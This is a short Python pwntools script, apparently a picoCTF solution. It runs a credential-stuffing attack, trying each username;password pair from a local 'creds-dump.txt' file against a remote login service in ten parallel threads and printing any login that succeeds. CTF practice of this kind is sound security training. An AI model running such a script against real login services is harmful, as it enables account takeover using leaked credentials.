from pwn import *
from concurrent.futures import ThreadPoolExecutor

def try_creds(line):
    clean_line = line.strip()
    username, password = clean_line.split(';')
    p = remote('crystal-peak.picoctf.net', 55517)
    p.recvuntil(b"Username: ")
    p.sendline(username)
    p.recvuntil(b"Password: ")
    p.sendline(password)
    res = p.recvall()
    if b"Invalid" not in res:
        print(res)
        
f = open("/home/kali/Downloads/creds-dump.txt")
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(try_creds, f)
    
    
